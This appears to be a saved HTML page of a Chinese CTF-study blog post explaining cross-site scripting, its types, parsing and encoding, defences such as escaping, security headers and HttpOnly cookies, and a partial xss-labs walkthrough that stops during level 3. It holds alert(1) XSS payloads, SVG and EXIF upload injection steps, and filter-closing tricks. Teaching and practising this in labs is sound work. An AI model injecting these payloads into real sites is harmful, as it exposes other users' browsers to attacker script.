@@ -1,0 +1,824 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Study_xss - Zsm Blog</title><meta name="Description" content="Zsm Blog,crypto,ctf,nodejs,wp,密码学"><meta property="og:url" content="https://www.zhuangsanmeng.xyz/study_xss/">
+  <meta property="og:site_name" content="Zsm Blog">
+  <meta property="og:title" content="Study_xss">
+  <meta property="og:description" content="XSS原理 XSS的原理是恶意攻击者往 Web 页面里插入恶意可执行网页脚本代码，当用户浏览该页之时，嵌入其中 Web 里面的脚本代码会被执行，从而可以达到攻击者盗取用户信息或其他侵犯用户安全隐私的目的。">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-05-09T21:25:33+08:00">
+    <meta property="article:modified_time" content="2025-05-09T21:25:33+08:00">
+    <meta property="article:tag" content="Study">
+    <meta property="og:image" content="https://www.zhuangsanmeng.xyz/">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://www.zhuangsanmeng.xyz/">
+  <meta name="twitter:title" content="Study_xss">
+  <meta name="twitter:description" content="XSS原理 XSS的原理是恶意攻击者往 Web 页面里插入恶意可执行网页脚本代码，当用户浏览该页之时，嵌入其中 Web 里面的脚本代码会被执行，从而可以达到攻击者盗取用户信息或其他侵犯用户安全隐私的目的。">
+<meta name="application-name" content="Zsm blog">
+<meta name="apple-mobile-web-app-title" content="Zsm blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/logo.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.zhuangsanmeng.xyz/study_xss/" /><link rel="prev" href="https://www.zhuangsanmeng.xyz/about51/" /><link rel="next" href="https://www.zhuangsanmeng.xyz/huangheliuyu/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Study_xss",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/www.zhuangsanmeng.xyz\/study_xss\/"
+        },"genre": "posts","keywords": "study","wordcount":  6764 ,
+        "url": "https:\/\/www.zhuangsanmeng.xyz\/study_xss\/","datePublished": "2025-05-09T21:25:33+08:00","dateModified": "2025-05-09T21:25:33+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Zsm"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Zsm Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo.png"
+        data-srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+        data-sizes="auto"
+        alt="/images/logo.png"
+        title="/images/logo.png" /></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about/" title="About"> 关于 </a><a class="menu-item" href="/friend/" title="Friend"> 友链 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Zsm Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo.png"
+        data-srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+        data-sizes="auto"
+        alt="/images/logo.png"
+        title="/images/logo.png" /></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about/" title="About">关于</a><a class="menu-item" href="/friend/" title="Friend">友链</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+    <h2 class="toc-title">Contents</h2>
+    <div class="toc-content" id="toc-content-auto"></div>
+</div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Study_xss</h1><div class="post-meta">
+        <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Zsm</a></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw"
+                    aria-hidden="true"></i>CTF</a></span></div>
+        <div class="post-meta-line">
+    
+
+    
+        
+
+        
+        
+            <span id="busuanzi_container_value_page_pv"><i class="far fa-eye fa-fw"></i>
+                
+                <span id="busuanzi_value_page_pv"></span>&nbsp;views</span>
+        
+    
+
+<i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2025-05-09">2025-05-09</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;6764 words&nbsp;
+            <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;14 minutes&nbsp;<span id="/study_xss/" class="leancloud_visitors" data-flag-title="Study_xss">
+                <i class="far fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span
+                    class=leancloud-visitors-count></span>&nbsp;views
+            </span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="">
+        <div class="details-summary toc-title">
+            <span>Contents</span>
+            <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#xss原理">XSS原理</a></li>
+    <li><a href="#xss攻击类型">XSS攻击类型</a>
+      <ul>
+        <li><a href="#反射型xss">反射型XSS</a></li>
+        <li><a href="#存储型xss">存储型XSS</a></li>
+        <li><a href="#dom-based-型">DOM-based 型</a></li>
+      </ul>
+    </li>
+    <li><a href="#代码解析">代码解析</a>
+      <ul>
+        <li><a href="#domhtml标记">DOM&amp;HTML标记</a></li>
+        <li><a href="#javascript的解析">JavaScript的解析</a></li>
+        <li><a href="#css代码的解析">CSS代码的解析</a></li>
+        <li><a href="#关于解码">关于解码</a></li>
+      </ul>
+    </li>
+    <li><a href="#实战">实战</a>
+      <ul>
+        <li><a href="#常见的基础的payload">常见的基础的payload</a></li>
+        <li><a href="#一般场景">一般场景</a></li>
+        <li><a href="#文件上传xss">文件上传XSS</a></li>
+        <li><a href="#pdf-xss">PDF-XSS</a></li>
+        <li><a href="#工具">工具</a></li>
+      </ul>
+    </li>
+    <li><a href="#关于防御">关于防御</a>
+      <ul>
+        <li><a href="#逻辑方面">逻辑方面</a></li>
+        <li><a href="#代码方面">代码方面</a></li>
+        <li><a href="#http头层次">HTTP头层次</a></li>
+        <li><a href="#httponly">HttpOnly</a></li>
+      </ul>
+    </li>
+    <li><a href="#xss-lab">XSS-lab</a>
+      <ul>
+        <li><a href="#关于靶场搭建">关于靶场搭建</a></li>
+        <li><a href="#level12">level1~2</a></li>
+        <li><a href="#level39字符过滤绕过">level3~9(字符过滤绕过)</a></li>
+        <li><a href="#level1016字段注入">level10~16(字段注入)</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+    </div><div class="content" id="content"><h2 id="xss原理">XSS原理</h2>
+<p>XSS的原理是恶意攻击者往 Web 页面里插入恶意可执行网页脚本代码，当用户浏览该页之时，嵌入其中 Web 里面的脚本代码会被执行，从而可以达到攻击者盗取用户信息或其他侵犯用户安全隐私的目的。</p>
+<h2 id="xss攻击类型">XSS攻击类型</h2>
+<p>根据XSS脚本注入方式的不同，我们可以将XSS攻击简单的分类为反射型XSS、存储型XSS、DOM-based 型。</p>
+<h3 id="反射型xss">反射型XSS</h3>
+<p>又称为非持久型XSS。<br>
+流程：发出请求(XSS代码嵌套进URL)&ndash;&gt;服务端解析并且响应&ndash;&gt;传回给浏览器并且解析</p>
+<p>特点：</p>
+<ol>
+<li>即时性。不经过服务器存储，直接通过 HTTP 的 GET 和 POST 请求就能完成一次攻击，拿到用户隐私数据</li>
+<li>攻击者需要受害者&quot;配合&quot;</li>
+<li>难发现，难修复，难收录()</li>
+<li>盗取用户敏感保密信息</li>
+</ol>
+<h3 id="存储型xss">存储型XSS</h3>
+<p>又称为持久型XSS，他和反射型XSS最大的不同就是，攻击脚本将被永久地存放在目标服务器端，下次不用再去提交XSS代码<br>
+一般存在于 Form 表单提交等交互功能，如发帖留言，提交文本信息等，黑客利用的 XSS 漏洞，将内容经正常功能提交进入数据库持久保存，当前端页面获得后端从数据库中读出的注入代码时，恰好将其渲染执行。<br>
+这种攻击多见于论坛，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入到帖子的内容之中。随着帖子被论坛服务器存储下来，恶意脚本也永久地被存放在论坛服务器的后端存储器中。当其它用户浏览这个被注入了恶意脚本的帖子的时候，恶意脚本则会在他们的浏览器中得到执行，从而受到了攻击。</p>
+<p>特点：</p>
+<ol>
+<li>持久性，直接打到数据库里面</li>
+<li>危害大。甚至可以把用户机器变成肉鸡去造成危害</li>
+<li>盗取用户敏感信息</li>
+</ol>
+<h3 id="dom-based-型">DOM-based 型</h3>
+<p>客户端的脚本程序可以动态地检查和修改页面内容，而不依赖于服务器端的数据。例如客户端如从 URL 中提取数据并在本地执行，如果用户在客户端输入的数据包含了恶意的 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到 DOM-based XSS 攻击。需要特别注意以下的用户输入源 document.URL、 location.hash、 location.search、 document.referrer 等。</p>
+<h2 id="代码解析">代码解析</h2>
+<h3 id="domhtml标记">DOM&amp;HTML标记</h3>
+<p>浏览器收到代码，先构建DOM树和解析HTML。<br>
+HTML标记解析一般比较快，包含了开始结束属性名和值，解析之后构建了文档树。<br>
+DOM树主要是描述文档的内容，可以反应标记之间的关系和层次结构。DOM节点越多，构建时间越长。不过有个特别的点，比如加载到一个img资源，会请求这个资源，并且下载，但是整个过程是异步的，浏览器会继续解析和生产HTML部分，并不会等待img下载完</p>
+<h3 id="javascript的解析">JavaScript的解析</h3>
+<p>顺序：HTML解析到JavaScript部分的时候，HTML会停止解析，控制权到JavaScript引擎，执行代码后再继续解析HTML。<br>
+缺点：如果JavaScript的代码运行过长，就会有负面影响，所以就会有异步(async/await)去处理。当JavaScript代码执行时，如果该代码修改了DOM结构或样式，可能会触发浏览器重新构建DOM树和应用样式，从而导致页面的重绘和回流，影响页面的性能。
+浏览器方面：当遇到<code>&lt;script&gt;</code>标签，就会停止HTML解析，进行JavaScript解析。遇到URL协议or事件属性的标记时，交给JavaScript去解析，如果还不行就会报错，这也就是为什么有时候在某个页面插入了XSS弹窗后，假如你不点击你的弹窗的相应的操作，某些元素就无法进行加载。</p>
+<h3 id="css代码的解析">CSS代码的解析</h3>
+<p>在遇到CSS代码时，浏览器不会像JavaScript代码一样去停止HTML标记的解析，相反它会继续进行HTML代码的解析，并且将CSS代码交给CSS引擎来进行处理。</p>
+<h3 id="关于解码">关于解码</h3>
+<p>HTML主要是为了避免歧义所以才解码的，比如<code>&lt;&gt;</code>这种东西可能是标签or属性值，那么传递的时候利用编码就不会有歧义了，例如<code>&lt;div&gt;</code>&ndash;&gt;<code>&amp;#x003c;&amp;#x0064;&amp;#x0069;&amp;#x0076;&amp;#x003e;</code>or<code>&amp;#60;&amp;#100;&amp;#105;&amp;#118;&amp;#62;</code>。<br>
+JavaScript主要是为了防止漏洞和语法错误，一般遇到<code>&lt;script&gt;</code>这种东西就回进行JS编码，但是<code>&lt; &gt; ' &quot; ( )</code>是不能JS编码的<br>
+举个栗子：<code>&lt;img src=# onerror=alert(1)&gt;</code>，解码之后是<code>&lt;img src=# onerror=\u0061\u006C\u0065\u0072\u0074(\u0031)&gt;</code>，而不是全部去解码</p>
+<h2 id="实战">实战</h2>
+<h3 id="常见的基础的payload">常见的基础的payload</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">script</span><span class="o">&gt;</span><span class="n">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">script</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">img</span> <span class="n">scr</span><span class="o">=</span><span class="mi">1</span> <span class="n">onerror</span><span class="o">=</span><span class="n">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">svg</span> <span class="n">onload</span><span class="o">=</span><span class="n">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="n">javascript</span><span class="p">:</span><span class="n">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span><span class="n">xss</span><span class="o">&lt;/</span><span class="n">a</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="ow">and</span> <span class="n">so</span> <span class="n">on</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="一般场景">一般场景</h3>
+<p>有框就插进去试试，记得F12锁定框去看看过滤了什么。</p>
+<h3 id="文件上传xss">文件上传XSS</h3>
+<ol>
+<li>修改文件后缀：bp抓了，上传文件的时候把后缀改成<code>.html</code>or<code>.htm</code>，然后在文件里面去插入XSS代码</li>
+<li>svg写入XSS：简单来说就是svg文件里面去嵌入XSS代码，例如</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; version=&#34;1.1&#34;&gt;
+</span></span><span class="line"><span class="cl">   &lt;circle cx=&#34;100&#34; cy=&#34;50&#34; r=&#34;40&#34; stroke=&#34;black&#34; stroke-width=&#34;2&#34; fill=&#34;red&#34; /&gt;
+</span></span><span class="line"><span class="cl">   &lt;script&gt;alert(1)&lt;/script&gt;
+</span></span><span class="line"><span class="cl">&lt;/svg&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="3">
+<li>exif写入XSS：前提需要网站解析图片的exif信息才可以成功使用此方法，<code>exiftool -Comment=&quot;&lt;script&gt;alert(1)&lt;/script&gt; filename.png&quot;</code></li>
+</ol>
+<h3 id="pdf-xss">PDF-XSS</h3>
+<p>PDF编辑里面可以插入XSS代码，写进去然后保存成PDF文件，传到浏览器。但是这不是我们最终的目的，在本地弹窗的意义不大，我们需要让某个网站在线解析或者打开我们制作好的PDF文件才可以，当然防御的方法就是用户在打开PDF文件时候，强制让用户在本地下载打开。</p>
+<p>更多方法看https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html</p>
+<h3 id="工具">工具</h3>
+<p>fuzz：https://github.com/TheKingOfDuck/easyXssPayload<br>
+XSStrike：python xsstrike.py -u http~</p>
+<h2 id="关于防御">关于防御</h2>
+<h3 id="逻辑方面">逻辑方面</h3>
+<ul>
+<li>一般的XSS：过滤/把HTML实体化编码特殊字符:<code>&lt;&gt;&quot;'</code>等</li>
+<li>文件上传XSS：检查后缀，剥离exif标签</li>
+<li>PDF-XSS：强制用户必须下载文件，而不能在线阅读</li>
+</ul>
+<h3 id="代码方面">代码方面</h3>
+<ul>
+<li>PHP的<code>htmlentities()</code>or<code>htmlspecialchars()</code></li>
+<li>python的<code>cgi.escape()</code></li>
+<li>ASP的<code>Server.HTMLEncode()</code></li>
+<li>Java的<code>xssprotect</code></li>
+<li>nodejs的<code>node-validator</code></li>
+</ul>
+<h3 id="http头层次">HTTP头层次</h3>
+<ul>
+<li>X-XSS-Protection</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">通过设置其值为1，启用浏览器的XSS防护，浏览器会做出下面的措施：
+</span></span><span class="line"><span class="cl">自动关闭或过滤掉潜在的XSS攻击脚本：浏览器会检测响应内容是否包含恶意脚本，并自动关闭或过滤掉这些脚本，防止它们被执行。
+</span></span><span class="line"><span class="cl">重定向到安全页面：如果浏览器检测到具有潜在XSS威胁的内容，它可能会将用户重定向到一个更安全的页面，以防止攻击脚本的执行。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>X-Download-Options</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">通过设置其值为noopen，使得浏览器下载文件时不自动打开，不关联下载文件和浏览器内嵌程序。这样可以防止一些特定类型的文件（例如html、pdf等）被当作网页打开，降低XSS攻击的风险。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>X-Content-Type-Options</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">通过设置X-Content-Type-Options头的值为&#34;nosniff&#34;，可以防止浏览器将响应内容以错误的方式解析，减少了XSS攻击的风险。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>X-Frame-Options</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">通过设置X-Frame-Options头，可以阻止通过嵌入iframe或frame的方式进行点击劫持攻击。可以设置该头的值为&#34;DENY&#34;，&#34;SAMEORIGIN&#34;或&#34;ALLOW-FROM &lt;域名&gt;&#34;。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>Content Security Policy（CSP）</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">通过设置CSP头，可以限制资源加载的来源，以防止执行不受信任的脚本。CSP可以指定允许的域名、允许的脚本类型以及其他安全策略。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="httponly">HttpOnly</h3>
+<p>当一个 cookie 设置了 HttpOnly 标志后，浏览器会禁止通过 JavaScript 脚本来读取这个 cookie 的值。这意味着即使有 XSS 攻击成功注入了恶意脚本，也无法从受害者浏览器中获取敏感的 cookie 值，从而有效防止了 cookie 盗取和会话劫持攻击。
+但是HttpOnly不能够完全防御XSS，只能减少XSS带来的危害。</p>
+<ul>
+<li>PHP</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">setcookie</span><span class="p">(</span><span class="s1">&#39;cookie_name&#39;</span><span class="p">,</span> <span class="s1">&#39;cookie_value&#39;</span><span class="p">,</span> <span class="nx">time</span><span class="p">()</span><span class="o">+</span><span class="mi">3600</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="k">false</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span> <span class="c1">// 最后一个参数设置为 true 表示设置 HttpOnly 标志，false 表示不设置
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>Java</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.http.Cookie</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Cookie</span><span class="w"> </span><span class="n">cookie</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Cookie</span><span class="p">(</span><span class="s">&#34;cookie_name&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;cookie_value&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">cookie</span><span class="p">.</span><span class="na">setMaxAge</span><span class="p">(</span><span class="n">3600</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">cookie</span><span class="p">.</span><span class="na">setPath</span><span class="p">(</span><span class="s">&#34;/&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">cookie</span><span class="p">.</span><span class="na">setHttpOnly</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w"> </span><span class="c1">// 设置 HttpOnly 标志</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">response</span><span class="p">.</span><span class="na">addCookie</span><span class="p">(</span><span class="n">cookie</span><span class="p">);</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>Python（Django 框架）</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">response</span><span class="o">.</span><span class="n">set_cookie</span><span class="p">(</span><span class="s1">&#39;cookie_name&#39;</span><span class="p">,</span> <span class="s1">&#39;cookie_value&#39;</span><span class="p">,</span> <span class="n">max_age</span><span class="o">=</span><span class="mi">3600</span><span class="p">,</span> <span class="n">httponly</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span> <span class="c1"># 设置 httponly=True 表示设置 HttpOnly 标志</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>nodejs</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">cnpm</span> <span class="nx">i</span> <span class="nx">xss</span> <span class="o">-</span><span class="nx">S</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="p">{</span><span class="nx">xss</span><span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;xss&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">newBlog</span> <span class="o">=</span> <span class="p">(</span><span class="nx">blogData</span> <span class="o">=</span> <span class="p">{})</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">title</span> <span class="o">=</span> <span class="nx">xss</span><span class="p">(</span><span class="nx">blogData</span><span class="p">.</span><span class="nx">title</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="xss-lab">XSS-lab</h2>
+<p>一个基础xss靶场，后面4个是关于flash的，就不写了</p>
+<h3 id="关于靶场搭建">关于靶场搭建</h3>
+<p>windows可以小皮搭建，mac/linux推荐docker</p>
+<blockquote>
+<p>docker run -d &ndash;name xss-labs -p 51142:80 shadowaura/xss-labs:latest</p></blockquote>
+<h3 id="level12">level1~2</h3>
+<p>无任何防御的两关</p>
+<p><strong>level1</strong><br>
+直接输入<code>&lt;script&gt;alert(1);&lt;/script&gt;</code>即可</p>
+<p><strong>level2</strong><br>
+先把老payload输入进去，发现不行，并且payload回显在</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;form action=&#34;level2.php&#34; method=&#34;GET&#34;&gt;
+</span></span><span class="line"><span class="cl">&lt;input name=&#34;keyword&#34; value=&#34;&lt;script&gt;alert(1)&lt;/scrpit&gt;&#34;&gt;
+</span></span><span class="line"><span class="cl">&lt;input type=&#34;submit&#34; name=&#34;submit&#34; value=&#34;搜索&#34;&gt;
+</span></span><span class="line"><span class="cl">&lt;/form&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>甚至发现这个并没有被转义，主要是因为没有闭合导致的，加入<code>&quot;&gt; </code>即可
+完整payload：<code>&quot;&gt; &lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+<h3 id="level39字符过滤绕过">level3~9(字符过滤绕过)</h3>
+<p><strong>level3</strong><br>
+注：php8.1.0及其以上版本已经修复
+<code>htmlspecialchars</code>函数，把预定义的字符转换为 HTML 实体</p>
+<ol>
+<li>&amp;：转换为&amp;</li>
+<li>&ldquo;：转换为&quot;</li>
+<li>&lsquo;：转换为成为 '</li>
